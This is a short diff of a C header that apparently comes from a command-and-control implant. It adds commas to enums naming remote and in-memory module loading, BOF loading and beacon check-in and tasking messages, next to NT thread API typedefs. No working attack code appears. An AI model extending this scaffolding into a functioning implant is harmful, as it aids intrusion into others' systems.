@@ -279,21 +279,21 @@ typedef NTSTATUS (NTAPI* NtAlertResumeThread_t)(HANDLE ThreadHandle, PULONG Prev
 typedef NTSTATUS (NTAPI* NtSignalAndWaitForSingleObject_t)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
 
 enum ModuleType {
-	LoadLocalFile	
-	LoadRemoteFile	
-	LoadMemory		
-	LoadBof			
-	NoLink			
+    LoadLocalFile,
+    LoadRemoteFile,	
+    LoadMemory,		
+    LoadBof,			
+    NoLink,			
 };
 
 enum MessageType {
-	TypeCheckin    
-	TypeTasking    
-	TypeResponse   
-	TypeSegment    
-    TypeExecute    
-	TypeObject		
-    TypeError		
+    TypeCheckin,    
+    TypeTasking,    
+    TypeResponse,   
+    TypeSegment,    
+    TypeExecute,    
+    TypeObject,		
+    TypeError,		
 };
 
 enum DX_MEMORY {
